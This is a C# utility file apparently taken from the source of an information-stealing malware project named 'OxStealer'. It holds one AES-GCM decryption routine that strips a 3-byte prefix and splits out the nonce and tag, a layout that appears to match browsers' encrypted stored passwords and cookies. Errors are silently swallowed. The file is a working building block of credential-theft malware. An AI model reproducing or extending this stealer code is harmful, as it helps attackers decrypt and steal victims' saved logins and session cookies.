using System;
using System.Security.Cryptography;

namespace OxStealer.Utils
{
    internal static class AesGcm
    {
        public static string Decrypt(byte[] key, byte[] enc)
        {
            try
            {
                var nonce = new byte[12];
                var tag = new byte[16];
                var ct = new byte[enc.Length - 3 - 12 - 16];
                Buffer.BlockCopy(enc, 3, nonce, 0, 12);
                Buffer.BlockCopy(enc, enc.Length - 16, tag, 0, 16);
                Buffer.BlockCopy(enc, 15, ct, 0, ct.Length);
                var plain = new byte[ct.Length];
                using var gcm = new System.Security.Cryptography.AesGcm(key, 16); // Passato 16 come tag size
                gcm.Decrypt(nonce, ct, tag, plain);
                return System.Text.Encoding.UTF8.GetString(plain);
            }
            catch { return ""; }
        }
    }
}